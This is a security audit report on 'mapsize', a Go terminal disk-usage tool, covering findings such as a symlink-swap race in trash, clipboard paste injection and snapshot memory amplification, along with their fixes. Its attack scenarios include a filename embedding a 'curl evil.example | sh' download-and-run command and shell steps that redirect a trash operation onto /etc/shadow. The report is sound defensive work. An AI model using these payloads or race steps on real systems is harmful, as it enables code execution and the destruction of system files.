# Security Audit Report

Project: **mapsize** (Go, `github.com/andydixon/mapsize`), an interactive terminal disk-usage analyser, at v1.0.0 plus fixes.
Date: 2026-10-02. Audit commits: `3ec5bd7`, `1f9429e`, `5966fdd`, `3264def`, `b009ac3` (all with the subject "AI codebase review").

## 1. Executive Summary

mapsize is a local, single-user CLI/TUI. It has no network listener, no authentication, no stored secrets, and no native code beyond syscalls made through `golang.org/x/sys`. Its attack surface is **filesystem content controlled by other users** (file names, file types, directory layout, and races against the scan) and **snapshot files** (`.msz`) that people may share. The codebase was already defensive: it sanitises terminal output with a second check in the canvas, never invokes a shell, validates snapshots carefully, and checks the ownership of shared trash directories.

The most important issues were in the places where mapsize **acts on the filesystem after the scan**:

- **MS-01 (Medium, fixed).** Trash renamed items by path long after the scan. If another user swapped a parent directory for a symlink, an administrator cleaning that user's tree could move an unrelated file (for example `/etc/shadow`) into the trash.
- **MS-02 (Medium, fixed).** "Copy path" put raw filenames on the clipboard through OSC 52. A filename containing newlines runs commands when it is pasted into a shell.
- **MS-03 (Medium, fixed).** The snapshot decompression limit allowed roughly 600× memory amplification. An 804 KB crafted file was measured at about 500 MB of heap.
- **MS-04 (Low, fixed).** The duplicate finder could be wedged permanently by a file that was swapped for a FIFO after the scan. Cancelling did not help.

All four now have regression tests. No vulnerable dependencies were found (`govulncheck`: none). The remaining items are low-severity defence-in-depth or supply-chain hygiene.

**Architectural concern:** operations after the scan still resolve paths again (scanner directory opens, duplicate hashing, reveal). Fully race-free handling needs descriptor-relative traversal (`openat` chains or `openat2(RESOLVE_NO_SYMLINKS)`). The trash fix applies this only to the final parent directory.

## 2. Scope Reviewed

- **Languages and frameworks:** Go 1.26 (toolchain 1.27.1 used locally), Bubble Tea v2 (`charm.land/bubbletea/v2`), `charmbracelet/x/ansi`, `rivo/uniseg`, `golang.org/x/sys`.
- **Source:** all 85 tracked files, including `cmd/mapsize`, `cmd/treegen`, and every package under `internal/` (app, brand, config, duplicate, export, filter, inventory, platform, scan, snapshot, textutil, treemap, tui).
- **Build and deployment:** `Makefile` (build, install, release, brew-formula), `nfpm.yaml`, `packaging/homebrew/mapsize.rb.in`, `.github/workflows/ci.yml`, `scripts/bench-scan.sh`.
- **Dependencies:** `go.mod`, `go.sum`.
- **Tests:** every `*_test.go`, including the hostile-snapshot, fuzz, scan-stress and TUI tests.
- **Documentation:** ARCHITECTURE.md (its invariants were checked against the code), README.md, and the man page.
- **Not in scope:** there are no Dockerfiles, IaC, web frontend or servers.

## 3. Methodology

- **Static review:** a manual line-by-line reading of the trust-boundary code (platform ops, snapshot decoder, scanner, duplicate finder, exporters, TUI actions and rendering, config).
- **Adversarial mapping:** the attacker starting points considered were (a) a local user who can write inside the scanned tree, (b) the author of a snapshot file, and (c) a compromised dependency or CI pipeline.
- **Dynamic validation:** the following findings were reproduced locally with tests before they were fixed:
  - MS-04: a test hung at its 5 s timeout before the fix.
  - MS-03: an 804 KB crafted snapshot produced 4.2 M nodes and 497 MB `HeapInuse`.
  - MS-01 and MS-02: regression tests were written against the old behaviour.
- **Dependency review:** `govulncheck ./...` (latest) reported no vulnerabilities; `go vet` and the full test suite are clean; cross-platform `go vet` was run for darwin, windows and freebsd.
- **Specific reviews:** cryptography, the secrets lifecycle, memory and resource safety, DoS and terminal-injection reviews, using the checklists in the brief.

## 4. Risk Rating Method

Severity combines impact and likelihood in mapsize's realistic deployment, which is a user or administrator running it interactively, sometimes as root, over trees that other users can write to.

- **Critical/High:** remote or unauthenticated compromise, or reliable privilege escalation. None found.
- **Medium:** integrity, confidentiality or availability impact that needs a plausible precondition (another local user's tree, or opening a shared snapshot) plus a user action.
- **Low:** narrow races, partial impact, or hygiene problems with a credible but unlikely path.
- **Informational:** defence-in-depth or documentation.

Confidence:

- **High:** reproduced, or directly evident in the code.
- **Medium:** the reasoning is sound but it was not reproduced.
- **Low:** depends on unverified external behaviour, such as Windows `explorer.exe` argument parsing.

## 5. Attack Surface Map

| Entry point | Trust | Notes |
|---|---|---|
| Directory and file names, types and layout under the scanned root | **Untrusted** (other local users) | Names reach the terminal, the clipboard, CSV/JSON output and trashinfo. Layout can change between the scan and an action (TOCTOU). |
| Snapshot files (`mapsize FILE.msz`, `--load`, `--compare`) | **Untrusted** (shared by colleagues or downloaded) | Binary gzip format with a SHA-256 trailer (integrity only). Decoded in `internal/snapshot/snapshot.go`. |
| Filter query (`/` in the TUI) | Local user | RE2 regex (linear time) and `filepath.Match`. |
| CLI flags, config JSON (`$XDG_CONFIG_HOME/mapsize/config.json`) | Local user | Paths for `--save`, `--log`, `--cpuprofile` and `--memprofile` are written as specified. |
| External helpers | Executed with argument vectors | `xdg-open`, `open -R`, `explorer.exe /select,`. No shell is used. |
| Trash | Mutating | freedesktop.org trash on Linux, `~/.Trash` and volume `.Trashes/<uid>` on macOS, `SHFileOperationW` on Windows. |
| Clipboard | Output | OSC 52 written to the terminal. |
| CI/release | Supply chain | GitHub Actions, `go run nfpm@v2.41.1`, and `curl` of the release tarball for the Homebrew sha256. |

**Attacker positions:**

- **A1:** an unprivileged user who owns a subtree that an administrator scans as root, such as `/home`, `/srv/shared` or `/tmp`.
- **A2:** the sender of a snapshot file.
- **A3:** a compromised upstream action or module.

**Not present:** network listeners, IPC, authentication, sessions, secrets, databases, web frontend.

## 6. Findings Summary Table

| ID | Severity | Confidence | Title | Component | Status |
|---|---|---|---|---|---|
| MS-01 | Medium | High | Trash follows a parent swapped for a symlink after the scan (TOCTOU) | `internal/platform/ops_linux.go`, `ops_darwin.go`, `internal/tui/actions.go` | Fixed (`3ec5bd7`) |
| MS-02 | Medium | High | Copy-path puts control characters on the clipboard (paste injection) | `internal/tui/keys.go`, `modals.go` | Fixed (`1f9429e`) |
| MS-03 | Medium | High | Snapshot node amplification exhausts memory (about 600×) | `internal/snapshot/snapshot.go` | Fixed (`b009ac3`) |
| MS-04 | Low | High | Duplicate finder blocks forever on a file swapped for a FIFO | `internal/duplicate/duplicate.go` | Fixed (`5966fdd`) |
| MS-05 | Low | Medium | macOS volume trash directory not checked for symlinks or ownership | `internal/platform/ops_darwin.go` | Fixed (`3ec5bd7`) |
| MS-06 | Low | High | CI workflow runs with the default `GITHUB_TOKEN` permissions | `.github/workflows/ci.yml` | Fixed (`3264def`) |
| MS-07 | Informational | High | Snapshot `follow` metadata displayed unsanitised | `internal/tui/infoview.go` | Fixed (`3264def`) |
| MS-08 | Low | Medium | Scanner opens directories by path, so a symlink-swap race redirects the scan | `internal/platform/readdir_*.go`, `internal/scan/scan.go` | Open |
| MS-09 | Low | Low | Windows "reveal" passes hostile names to `explorer.exe`'s non-standard parser | `internal/platform/ops_windows.go` | Open (needs verification) |
| MS-10 | Low | High | Actions pinned to mutable tags; release artifacts unsigned | `.github/workflows/ci.yml`, `Makefile` | Open |
| MS-11 | Informational | High | Trash identity check has residual gaps (Windows; same owner and type) | `internal/platform` | Open (accepted) |
| MS-12 | Informational | High | Duplicate hashing and reveal re-resolve paths (intermediate symlinks) | `internal/duplicate`, `internal/platform/ops*.go` | Open |
| MS-13 | Informational | High | Snapshots are integrity-checked but not authenticated, and contain host and user metadata | `internal/snapshot` | Open (accepted) |
| MS-14 | Informational | High | JSON export is not terminal-sanitised (bidi) and is lossy for non-UTF-8 names | `internal/export/export.go` | Open |
| MS-15 | Informational | Medium | Filter parser recursion is unbounded on deeply nested input | `internal/filter/parser.go` | Open |

## 7. Detailed Findings

### Finding ID: MS-01

#### Title
Trash follows a parent directory swapped for a symlink after the scan (TOCTOU)

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`internal/platform/ops_linux.go` `Trash` (previously `os.Rename(path, dst)`), `internal/platform/ops_darwin.go` `Trash`, and `internal/tui/actions.go` `requestTrash`.

#### Description
The path to trash is rebuilt from the inventory (`m.tree.Path(id)`) and renamed after the user confirms. Every path component is resolved again at rename time. Between the scan and the confirmation (a window of human think-time) the owner of any parent directory can replace it with a symlink. The rename then moves whatever has the same name under the symlink target.

#### Evidence
Before the fix, `ops_linux.go` did this:
```go
if err := os.Rename(path, dst); err != nil {   // path re-resolved, all components followed
```
There was no comparison with what the scan recorded. `checkAbs` only did `Lstat` on the final component.

#### Attack Scenario
1. Eve owns `/home/eve/junk/`. She creates a large file named `shadow` in it.
2. The root user runs `mapsize /home`, sees `/home/eve/junk/shadow` (20 GB), and presses `d`.
3. Before root confirms, Eve runs `mv junk junk.old; ln -s /etc junk`. A symlink toggler makes the timing irrelevant.
4. Root confirms, and `rename("/home/eve/junk/shadow", "/root/.local/share/Trash/files/shadow")` moves **`/etc/shadow`**. Logins break and the hash file now sits in root's trash.

The same works for any root-owned file with a guessable name.

#### Impact
Integrity and availability of arbitrary files writable by the user running mapsize, which is the whole system for root. This is denial of service, and it can cause privilege problems such as a missing `/etc/sudoers.d/x` or a broken PAM configuration.

#### Recommendation
Open the parent directory once. Check and rename relative to that descriptor, and verify that the item still matches the scan (owner and file type).

#### Safer Example
This is what was implemented in `internal/platform/trash_unix.go`:
```go
dfd, _ := unix.Open(dir, unix.O_RDONLY|unix.O_DIRECTORY|unix.O_CLOEXEC, 0)
unix.Fstatat(dfd, base, &st, unix.AT_SYMLINK_NOFOLLOW)
if st.Uid != want.UID || modeFromUnix(uint32(st.Mode))&fs.ModeType != want.Mode&fs.ModeType {
    return errors.New("item changed since the scan (owner or type differs); rescan first")
}
return unix.Renameat(dfd, base, unix.AT_FDCWD, dst)
```
`requestTrash` captures `platform.Expect{UID: n.UID, Mode: n.Mode}` from the scanned node. A swapped parent now resolves to `/etc`, `shadow` there is owned by uid 0 rather than eve, and the move is refused. Because the check and the rename use the same descriptor, a toggler cannot win the race between them.

#### Suggested Tests
`TestTrashRefusesSwappedItem` (added) covers a symlink where a file was scanned, a type mismatch, an owner mismatch, no leftover `.trashinfo`, and the legitimate path still working.

#### References
CWE-367 (TOCTOU), CWE-59 (link following), OWASP ASVS V12.3.

#### Assumptions / Limitations
See MS-11 for the residual gaps: Windows has no check, and a same-owner, same-type target is still possible. The trash destination path is still resolved by path, but it lives under the user's own home or under a private `.Trash-$uid` directory that has been checked.

---

### Finding ID: MS-02

#### Title
Copy-path puts control characters on the clipboard (paste injection)

#### Severity
Medium

#### Confidence
High

#### Affected Files / Components
`internal/tui/keys.go` `copyPath` and `internal/tui/modals.go` (the `c` key in the info modal).

#### Description
The raw path was sent with `tea.SetClipboard(p)` (OSC 52). Unix filenames may contain `\n` and other control bytes, and snapshot names may contain anything except `/` and NUL. The UI displays these names escaped, so the user cannot see that the clipboard holds an executable multi-line payload.

#### Evidence
```go
return tea.Batch(tea.SetClipboard(p), m.info("Copied path to clipboard (OSC 52)"))
```

#### Attack Scenario
An attacker creates `/srv/share/report\ncurl -s evil.example/x | sh\n.pdf`. The administrator selects it, presses `c`, and pastes into a root shell. In a shell or terminal without bracketed paste (older bash, `sh`, many serial and SSH consoles) the embedded command runs. Bidi overrides can also disguise the visible text.

#### Impact
Arbitrary command execution as the user who pastes. User interaction is required.

#### Recommendation
Refuse to copy any path that `textutil.Sanitize` would change (control characters, C1, bidi, invalid UTF-8) and tell the user why.

#### Safer Example
```go
if textutil.Sanitize(p) != p {
    return m.warn("Not copied: path contains control or bidi characters")
}
```

#### Suggested Tests
`TestCopyRefusesControlCharacters` (added) covers a newline payload, the existing ESC/OSC hostile name, and a CJK path that must still be copied.

#### References
CWE-150 (improper neutralisation of escape sequences), CWE-77; also known as "pastejacking".

#### Assumptions / Limitations
A copy of a legitimate but unusual name is now refused. The info modal still shows the escaped form.

---

### Finding ID: MS-03

#### Title
Snapshot node amplification exhausts memory

#### Severity
Medium

#### Confidence
High (measured)

#### Affected Files / Components
`internal/snapshot/snapshot.go` `LoadFile`, `LoadLimit`, `bodyLimit`.

#### Description
The decompressed body was capped at `max(64 MiB, 64 × file size)`, but the node count was capped only at `2^31−1`. A crafted body made of repeating blocks (one directory followed by K−1 files whose parent deltas run 1…K−1) compresses extremely well and stays within the depth limit. Each node costs about 120 bytes of heap.

#### Evidence
A local measurement before the fix: a **804 KB** file decoded to a 59 MB body, **4,200,001 nodes**, and **497 MB `HeapInuse`**. Because the body limit grows 64× with file size, a ~20 MB crafted file could demand about 10 GB. ARCHITECTURE.md claimed "decompression bombs fail fast", which held for the body but not for allocated memory.

#### Attack Scenario
A colleague sends `server.msz`. Opening it with `mapsize server.msz` or `--compare` triggers the OOM killer, or swap pressure on a shared host.

#### Impact
Local denial of service. User interaction is required.

#### Recommendation and Safer Example
Bound the node count by the compressed size. Real snapshots use about 15 bytes per node (PERFORMANCE.md), so one node per byte leaves at least 15× headroom:
```go
func nodeLimit(fileSize int64) uint64 { return uint64(max(1<<20, fileSize)) }
```
`LoadFile` now passes `nodeLimit(fi.Size())`. The node-count error is now reported before the "no root node" check, which previously masked limit errors.

#### Suggested Tests
`TestNodeAmplificationLimited` (added): 1.2 M nodes in a 137 KB file are refused with a "node count" error, and the same data still loads through the unbounded `Load` path, which proves the input is otherwise valid.

#### References
CWE-400, CWE-409 (highly compressed data), CWE-770.

#### Assumptions / Limitations
The 1 Mi-node floor still lets a tiny file allocate about 120 MB, which is acceptable. `Load`/`LoadLimit` on an `io.Reader` keep `MaxNodes`, because no file size is known there; production code uses only `LoadFile`.

---

### Finding ID: MS-04

#### Title
Duplicate finder blocks forever on a file swapped for a FIFO

#### Severity
Low

#### Confidence
High (reproduced)

#### Affected Files / Components
`internal/duplicate/duplicate.go` `open`; new `internal/platform/open_unix.go`.

#### Description
Candidates were reopened by path with `os.Open`. Opening a FIFO for reading blocks until a writer appears. The `fi.Mode().IsRegular()` check ran after the open, too late. Context cancellation (Esc, Ctrl+C) cannot interrupt a blocked `open(2)`, so the duplicate view stayed on "hashing" forever and `--duplicates` never exited, which matters for cron jobs.

#### Evidence and Reproduction
`TestFindSkipsSwappedFIFO`: scan `a`, `b` and `c` (identical content), replace `b` with `mkfifo b` and `c` with a symlink to a FIFO, then run `Find`. It timed out after 5 s before the fix and finishes immediately afterwards with `Skipped == 2`.

#### Impact
Availability of the duplicate feature, and a hang of the non-interactive mode. Any user who can write in the scanned tree can trigger it.

#### Recommendation and Safer Example
```go
os.OpenFile(path, os.O_RDONLY|syscall.O_NOFOLLOW|syscall.O_NONBLOCK, 0)
```
`O_NONBLOCK` makes the FIFO open return at once, and the existing regular-file check then skips it. `O_NOFOLLOW` refuses a final symlink. Regular-file reads are unaffected.

#### Suggested Tests
Added as above. Consider a cancellation test for a slow reader as well.

#### References
CWE-367, CWE-833 (deadlock), CWE-400.

#### Assumptions / Limitations
Intermediate path components can still be swapped (MS-12). On Windows, `os.Open` remains unchanged.

---

### Finding ID: MS-05

#### Title
macOS volume trash directory not checked for symlinks or ownership

#### Severity
Low

#### Confidence
Medium (reasoned, not run on macOS)

#### Affected Files / Components
`internal/platform/ops_darwin.go` `Trash`.

#### Description
`os.MkdirAll("/Volumes/X/.Trashes/<uid>", 0700)` silently accepts an existing directory or a symlink to one that another user planted on a shared or ignore-ownership volume. Files would then be moved into a location the attacker controls. The Linux code already defended against this with `ensurePrivateDir`.

#### Attack Scenario
On a shared external volume, Mallory creates `.Trashes/501 -> /Volumes/X/mallory-readable/`. User 501 trashes `payroll.xlsx`, and Mallory can now read it.

#### Impact
Disclosure of trashed files.

#### Recommendation and Safer Example
`ensurePrivateDir` was moved to a shared `trash_unix.go` (linux or darwin). Darwin now calls it with `strict=true` for volume trashes, which requires a real directory owned by the user with no group or other access.

#### Suggested Tests
`TestEnsurePrivateDirRejectsSymlink` already covers the helper. A macOS CI job running the platform tests is recommended.

#### References
CWE-59, CWE-276.

#### Assumptions / Limitations
`.Trashes` itself is not checked. The final directory being 0700 and owned by the user limits exposure, but the parent's owner could still rename it.

---

### Finding ID: MS-06

#### Title
CI workflow runs with the default `GITHUB_TOKEN` permissions

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`.github/workflows/ci.yml`

#### Description
There was no `permissions:` block, so jobs received the repository or organisation default token scope, which is write access on older repositories. The workflow runs third-party actions and `go test` (which executes arbitrary test code and dependencies). A compromised action or dependency could therefore push to the repository.

#### Recommendation
`permissions: contents: read` was added at the workflow level.

#### References
CWE-250, OpenSSF Scorecard "Token-Permissions".

#### Assumptions / Limitations
Whether the repository default is read-only could not be checked from here.

---

### Finding ID: MS-07

#### Title
Snapshot `follow` metadata displayed unsanitised

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`internal/tui/infoview.go` (`line("Follow symlinks", st.Follow, …)`)

#### Description
Every other snapshot metadata string (root, excludes, the `FromSnapshot` string) goes through `textutil.Sanitize`. `Follow` did not. The canvas's own control-character filter, together with zero-width clusters being dropped, meant this was **not exploitable**: hostile bytes were replaced with `?`. It is fixed for consistency with the documented invariant.

#### Recommendation
Use `textutil.Sanitize(st.Follow)` (done).

#### References
CWE-150.

#### Assumptions / Limitations
None.

---

### Finding ID: MS-08

#### Title
Scanner opens directories by path, so a symlink-swap race redirects the scan

#### Severity
Low

#### Confidence
Medium

#### Affected Files / Components
`internal/platform/readdir_linux.go`, `readdir_bsd.go` (`unix.Open(path, O_RDONLY|O_DIRECTORY)`), and `internal/scan/scan.go` `makeJob`/`worker`.

#### Description
Entries are `lstat`'d relative to the directory fd, but each pending directory is later opened by its full path. A directory that was a real directory at `lstat` time can be swapped for a symlink before the worker opens it, and the scan then descends into the target. With `--follow-symlinks=none` the visited set is disabled, so a fast toggler can make the scan revisit or inflate subtrees until `PATH_MAX`.

#### Attack Scenario
Eve toggles `/home/eve/a` between a directory and a symlink to `/`. Root's scan of `/home` then includes parts of `/`, so totals are wrong. With repeated wins it can grow memory and time, bounded by path length.

#### Impact
Inaccurate inventory, wasted time and memory. Nothing is read beyond metadata and nothing is written. However, the inventory could then offer root's files to trash under Eve's path; MS-01's owner check now blocks that.

#### Recommendation
Pass a "followed" bit with each job and open non-followed directories with `O_NOFOLLOW`. For a full fix, keep a parent fd per job and use `openat(parentfd, name, O_NOFOLLOW|O_DIRECTORY)`, or `openat2(RESOLVE_BENEATH|RESOLVE_NO_SYMLINKS)` on Linux 5.6+. Also compare `fstat(dirfd)` with the scanned (dev, ino).

#### Safer Example
```go
fd, err := unix.Open(path, unix.O_RDONLY|unix.O_DIRECTORY|unix.O_CLOEXEC|unix.O_NOFOLLOW, 0)
// then: unix.Fstat(fd,&st); if st.Dev!=want.Dev||st.Ino!=want.Ino { return errChanged }
```

#### Suggested Tests
A test with a toggling goroutine that asserts no node outside the root's device and inode set appears.

#### References
CWE-367, CWE-59.

#### Assumptions / Limitations
This was left open because a partial `O_NOFOLLOW` on the final component only does not stop swaps of intermediate components. The real fix is the fd-relative redesign, which is larger than an audit fix should be.

---

### Finding ID: MS-09

#### Title
Windows "reveal" passes hostile names to `explorer.exe`'s non-standard parser

#### Severity
Low

#### Confidence
Low

#### Affected Files / Components
`internal/platform/ops_windows.go` `Reveal` (`startDetached("explorer.exe", "/select,", path)`).

#### Description
`explorer.exe` parses its own command line and treats commas as switch separators. Go quotes arguments using MSVCRT rules, which Explorer may not honour. A filename containing `,` (legal on Windows) might be split into additional Explorer switches or paths. If Explorer is given a path to an executable, it launches it.

#### Attack Scenario (unverified)
A file named `x,C:\Users\Public\evil.exe` must exist for `checkAbs` to pass. Revealing it might make Explorer open or run `evil.exe`.

#### Recommendation
Verify on Windows. If the behaviour is confirmed, refuse paths containing `,` or `"`, or use `SHOpenFolderAndSelectItems` through COM, which takes a PIDL and does no parsing.

#### Suggested Tests
A manual Windows test with comma-bearing names.

#### References
CWE-88 (argument injection).

#### Assumptions / Limitations
This could not be tested here, so it was not changed.

---

### Finding ID: MS-10

#### Title
Actions pinned to mutable tags; release artifacts unsigned

#### Severity
Low

#### Confidence
High

#### Affected Files / Components
`.github/workflows/ci.yml` (`actions/checkout@v4`, `actions/setup-go@v5`) and the `Makefile` `release`/`brew-formula` targets.

#### Description
Tags can be moved by a compromised upstream. `make release` writes an unsigned `SHA256SUMS`. `brew-formula` trusts the first `curl` of GitHub's tarball, a trust-on-first-use approach. `nfpm` is fetched through `go run …@v2.41.1`, which is pinned and verified by the Go checksum database. That is good.

#### Recommendation
- Pin actions by commit SHA, with Dependabot keeping them current.
- Sign releases with Sigstore `cosign sign-blob` or minisign, and/or publish SLSA provenance through GitHub's attest-build-provenance.
- Build releases in CI rather than on a workstation.

#### References
SLSA L2/L3, OpenSSF Scorecard "Pinned-Dependencies" and "Signed-Releases".

#### Assumptions / Limitations
The commit SHAs could not be verified offline, so the workflow was not changed here.

---

### Finding ID: MS-11

#### Title
Trash identity check has residual gaps

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`internal/platform/ops_windows.go` and `trash_unix.go`.

#### Description
- On Windows, `Expect` is ignored: the scan records no owner or inode, and `SHFileOperationW` works by path.
- On Unix, the check compares owner and file type, not inode, because `inventory.Node` does not store (dev, ino). A swapped parent that leads to a same-named item with the same owner and type is still accepted. Exploiting this needs a target owned by the attacker or by the item's original owner, so there is no cross-user gain, except where root-owned items sit in attacker-writable directories.

#### Recommendation
Store `Ino`/`Dev` for files that are candidates for trashing, or re-`Lstat` before confirmation and keep the parent fd open across the dialog. On Windows, use `IFileOperation` with a handle opened with `FILE_FLAG_OPEN_REPARSE_POINT` and check the file ID.

#### References
CWE-367.

#### Assumptions / Limitations
None.

---

### Finding ID: MS-12

#### Title
Duplicate hashing and reveal re-resolve paths through intermediate symlinks

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`internal/duplicate/duplicate.go` (`open`) and `internal/platform/ops_*.go` (`Reveal`).

#### Description
After MS-04, the final component is not followed, but intermediate components are. An attacker can make the duplicate finder hash a different same-size file. The result is a false "identical" report about files the user could already read. Hash prefixes are only shown locally, so there is no disclosure to the attacker. Reveal can open a file manager at a different directory.

#### Recommendation
Use the same fd-relative traversal as MS-08 if that is implemented. Until then, the trash owner check (MS-01) prevents acting destructively on such a report.

#### References
CWE-59.

#### Assumptions / Limitations
None.

---

### Finding ID: MS-13

#### Title
Snapshots are integrity-checked but not authenticated, and contain host and user metadata

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`internal/snapshot/snapshot.go`

#### Description
The SHA-256 trailer is unkeyed. It detects corruption, not forgery: anyone can craft a valid file, which is how the hostile tests work. Snapshots contain full paths, uid and gid, mtimes, and the hostname. The files are created 0600 (`os.CreateTemp`) and renamed atomically, which is good.

#### Recommendation
Document that snapshots are sensitive, and that their contents are only as trustworthy as their source. If provenance ever matters, add an optional Ed25519 signature; for long-lived archives, consider ML-DSA or a hybrid. Not otherwise needed.

#### References
CWE-345, CWE-359.

#### Assumptions / Limitations
None.

---

### Finding ID: MS-14

#### Title
JSON export is not terminal-sanitised and is lossy for non-UTF-8 names

#### Severity
Informational

#### Confidence
High

#### Affected Files / Components
`internal/export/export.go` `JSON`/`writeNode`.

#### Description
`encoding/json` escapes C0 characters and replaces invalid UTF-8 with U+FFFD. Raw ESC therefore cannot reach the terminal (verified), but bidi overrides pass through when `--json` is printed to a terminal. Separately, names that are not valid UTF-8 are irreversibly altered, so consumers cannot map entries back to real files.

#### Recommendation
Add a `name_b64` or `name_escaped` field for non-UTF-8 names. Bidi characters in JSON are acceptable for machine consumers.

#### References
CWE-116.

#### Assumptions / Limitations
None.

---

### Finding ID: MS-15

#### Title
Filter parser recursion is unbounded on deeply nested input

#### Severity
Informational

#### Confidence
Medium

#### Affected Files / Components
`internal/filter/parser.go` (`unary` → `or` recursion on `(` and `NOT`).

#### Description
The query is typed by the local user, so this is self-inflicted at most. Pasting about a million `(` characters could approach Go's 1 GB stack limit and crash the process (terminal restoration is not guaranteed on a fatal stack overflow). `FuzzParse` exists.

#### Recommendation
Reject queries longer than about 4 KiB or nested more than about 256 levels.

#### References
CWE-674.

#### Assumptions / Limitations
None.

## 8. Blackhat-Style Abuse Paths

1. **Delete a system file through an administrator's cleanup (MS-01, now fixed).**
   - Prerequisite: an attacker-owned directory inside the scanned tree, and root trashing an item in it.
   - Chain: plant a large file named like the target, then swap the parent directory for a symlink to `/etc`; root presses `d` and moves `/etc/<name>`.
   - Breakpoint: the parent fd is pinned and the owner and type are checked. The remaining gap is a same-owner target (MS-11).
2. **Shell command execution by paste (MS-02, now fixed).**
   - Prerequisite: the victim copies a path, from a live scan or from a shared snapshot, and pastes it into a shell without bracketed paste.
   - Breakpoint: paths containing control or bidi characters are refused for copying.
3. **"Look at my snapshot" denial of service (MS-03, now fixed).** A tiny crafted `.msz` file caused an OOM; it is now bounded by the node limit.
4. **Wedge the nightly duplicate report (MS-04, now fixed).** `mkfifo` replaces a file that appeared in the scan, and `--duplicates` hung forever.
5. **Scan poisoning (MS-08, open).** Toggling symlinks inflates or falsifies inventory totals. The impact is limited to accuracy, because destructive actions are now identity-checked.
6. **Supply chain (MS-10, open).** A moved action tag or a compromised CI runner could produce tampered release archives with matching unsigned checksums. The breakpoints are SHA pinning and signed provenance.

## 9. Denial-of-Service and Resource Exhaustion Review

**Snapshot loading:**
- The body is limited to `max(64 MiB, 64×file)` and fails during streaming.
- The node count is now ≤ max(1 Mi, file bytes).
- Depth is ≤ 4096, which bounds recursion in the exporters.
- Names are ≤ 64 KiB, extensions ≤ 64 bytes, error messages ≤ 4 KiB, metadata JSON ≤ 16 MiB, and error records ≤ `MaxErrorRecords`.
- Sizes are ≤ 1 EiB, and aggregates are recomputed with saturating arithmetic.
- `gzip.Multistream(false)`; the decompression goroutine is unblocked by `pr.Close()` on early exit, so it does not leak.

**Scanner:**
- The worker pool is bounded (1–1024).
- The job and result channels are bounded, and the controller's select loop cannot deadlock (stress-tested with capacity 1).
- Directory reads are streamed in 1024-entry chunks.
- The write lock is held for at most 8192 entries at a time.
- The pending FIFO uses O(directories) × 8 bytes.
- The hard-link and visited maps grow with the number of inodes, which is inherent.
- Virtual filesystems (procfs and similar) are skipped, so `/proc/kcore` does not dominate a scan of `/`.
- The MS-08 race is the only input-driven amplification found.

**Duplicate finder:** a bounded worker pool (4), a 16 KiB sample buffer per worker, streaming SHA-256, and context checks between files and groups. The blocking FIFO open is fixed (MS-04). A reader blocked inside `read(2)` on a hung network filesystem still cannot be cancelled, which is inherent to file I/O.

**Filter:** RE2 runs in linear time, so there is no ReDoS. `filepath.Match` is polynomial. `Apply` checks `ctx` every 65,536 nodes. Unbounded nesting is covered by MS-15.

**TUI:** renders at most once per frame from a cache; resize storms cost one layout per frame; the 10 Hz tick runs only while needed.

**Exporters:** stream output, with recursion bounded by depth (4096 for snapshots, and the real filesystem depth for live scans).

## 10. Cryptography and Key Management Review

- **Algorithms in use:** SHA-256 for the snapshot integrity trailer and for duplicate content identity. Both are appropriate.
  - Duplicate identity requires a full-file SHA-256 match after the size and sample stages. Size and sampling are never treated as identity.
- **No encryption, signatures, MACs, tokens, passwords, TLS or randomness for security purposes.** `math/rand` appears only in `cmd/treegen`, a deterministic generator of synthetic test trees, which is a correct use.
- **Weak algorithms:** none present (no MD5, SHA-1, DES, RC4 or ECB).
- **Constant-time comparison:** `bytes.Equal` on the snapshot checksum is fine, because the value is not secret.
- **TLS:** the only network access is `curl -fsSL` in `make brew-formula`, which uses verified HTTPS by default; no flag disables verification.
- **Key management:** there are no keys.
- **Post-quantum:** there is no confidentiality-bearing cryptography, so there is no harvest-now-decrypt-later exposure. SHA-256's roughly 128-bit collision resistance against quantum attack is adequate. If signed snapshots or releases are added, use Ed25519 now and consider ML-DSA or a hybrid for long-lived artifacts (MS-10, MS-13).

## 11. Secrets Lifecycle and In-Memory Credential Review

- **At rest:** a search of source, tests, config and history found no secrets, keys, tokens or credentials. `.gitignore` excludes `bin/`, `*.msz`, `*.prof` and `*.test`.
- **Configuration:** `config.json` holds only display and scan preferences. No environment variables carry secrets; the variables read are `XDG_*`, `NO_COLOR`, `COLORTERM`, `MAPSIZE_ASCII` and `MAPSIZE_DEBUG_PANIC`.
- **In transit:** there is no network traffic, except the curl call in the Makefile, which uses a public URL.
- **In memory:** the application holds no credentials, so zeroisation, mlock and core-dump controls are not applicable.
  - The process does hold full path listings of the scanned tree. When running as root, a core dump could expose directory structure the dumping user cannot otherwise see. This is low risk, inherent, and no worse than `du`.
- **Diagnostic exposure:**
  - `--cpuprofile` and `--memprofile` write pprof files to paths the user specifies. They are created through `os.Create`, so with mode 0666 minus umask. Heap profiles contain path strings.
  - There is no network pprof or debug listener.
  - `MAPSIZE_DEBUG_PANIC` only causes a deliberate panic to test terminal restoration.
- **Logs:** `--log` is opened 0600 in append mode. slog's text handler quotes values that contain control characters, so log injection is neutralised. Logged content is limited to paths and errors.
- **Clipboard:** OSC 52 sends paths to the terminal emulator, and over SSH to the local machine's clipboard. That is intended; MS-02 hardened it.

## 12. Memory and Resource Safety Review

- **Native and FFI:** there is no cgo; builds use `CGO_ENABLED=0`. The only `unsafe` use is in `ops_windows.go`:
  - `shFileOpStruct` mirrors `SHFILEOPSTRUCTW` for 64-bit and is guarded by a `unsafe.Sizeof(uintptr(0)) != 8` check.
  - `pFrom` is a double-NUL-terminated UTF-16 slice that stays alive through the call, because `u` is referenced by `op` on the stack.
  - `syscall.UTF16FromString` rejects embedded NULs.
  - The struct layout matches Win64 natural alignment.
  - This is sound, with low residual risk on ARM64 Windows, which uses the same LLP64 layout.
- **Syscalls through x/sys:** `Statx`, `Fstatat`, `Renameat` and `Open` take Go-managed buffers, so there is no manual memory management.
- **Untrusted parsers:** the snapshot decoder validates every length against a maximum before `make([]byte, n)`. One subtlety remains: `bytesN` allocates `n` bytes before reading. With `MaxMetaLen` at 16 MiB and `MaxNameLen` at 64 KiB this is bounded per call, and on truncation the allocation is freed. Varint overflow is handled, and parent references are validated so that cycles are impossible.
